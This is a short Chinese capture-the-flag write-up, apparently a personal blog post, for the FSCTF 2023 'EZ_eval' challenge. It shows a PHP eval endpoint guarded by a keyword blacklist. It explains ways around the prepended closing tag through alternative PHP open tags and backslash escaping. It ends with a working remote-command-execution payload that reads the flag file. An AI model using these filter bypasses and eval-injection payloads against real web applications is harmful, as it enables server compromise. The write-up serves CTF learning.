# 【FSCTF 2023】EZ_eval


# [FSCTF 2023]EZ_eval

## 思路
* 源码

  ```
  &lt;?php
      if(isset($_GET[&#39;word&#39;])){
      $word = $_GET[&#39;word&#39;];
      if (preg_match(&#34;/cat|tac|tail|more|head|nl|flag|less| /&#34;, $word)){
         die(&#34;nonono.&#34;);
      }
      $word = str_replace(&#34;?&#34;, &#34;&#34;, $word);
      eval(&#34;?&gt;&#34;. $word);
  }else{
      highlight_file(__FILE__);
  }
  ```
  
  这里有三个问题
  
  * `?`过滤
  * `eval`命令前加了php结束符，无法执行我们输入的指令
  * 关键字过滤
  
  相对需要着急解决的是的 2，因为不解决啥也干不了。
  
* 对 2 解决方法

  * `&lt;? echo &#39;123&#39;;?&gt;`

    但前提是前提是开启配置参数short_open_tags=on

  * `&lt;script language=&#34;php&#34;&gt;echo &#39;hello&#39;;`

    不需要修改参数开关，但是只能在7.0以下可用

  * `&lt;% echo &#39;123&#39;;%&gt;`

    开启配置参数`asp_tags=on`，并且只能在7.0以下版本使用

* 对 1 解决方法：2 的第二个解决方法就顺带解决了

* 对 3 解决方法

  反斜杠绕过



## Payload

```
?word=&lt;script%09language=&#34;php&#34;&gt;system(&#34;c\at%09/fl\ag&#34;);
```

## 总结

* RCE
* eval执行时用了php的结束标志?&gt;绕过
* WAF绕过

---

> Author: [Ting](Tin10g.github.io)  
> URL: http://localhost:1313/posts/2024%E5%81%9A%E9%A2%98-fsctf-2023ez_eval/  

